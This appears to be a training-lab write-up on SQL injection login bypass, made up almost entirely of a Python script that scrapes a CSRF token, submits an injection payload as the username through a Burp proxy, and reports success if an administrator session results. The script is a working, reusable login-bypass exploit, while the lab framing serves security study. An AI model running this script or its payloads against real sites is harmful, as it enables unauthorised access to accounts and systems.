---
description: Lab Two involves an SQL injection vulnerability allowing login bypass.
---

# 2 - Login Bypass

```python
from bs4 import BeautifulSoup
import urllib3
import requests
import sys


# Disable 'Insecure Request' warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Burp proxy
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}


def get_csrf_token(s, url):
    """Get CSRF token from hidden input on '/login'"""
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input")["value"] # CSRF token on first input element
    
    return csrf


def exploit_sqli(s, url, payload):
    """Exploit SQL injection"""
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf, "username": payload, "password": "password"}
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text

    if "Log out" in res:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        # Get url and payload arguments
        url = sys.argv[1]
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <sql-paload>" % sys.argv[0])
        print("[-] Example: %s www.example.com \"1=1\"" % sys.argv[0])
        
        sys.exit(-1)

    s = requests.Session() # Persist certain parameters across session

    if exploit_sqli(s, url, sqli_payload):
        print("[+] SQL Injection successful! We have logged in as the administrator!")
    else:
        print("[-] SQL Injection unsuccessul.")
```
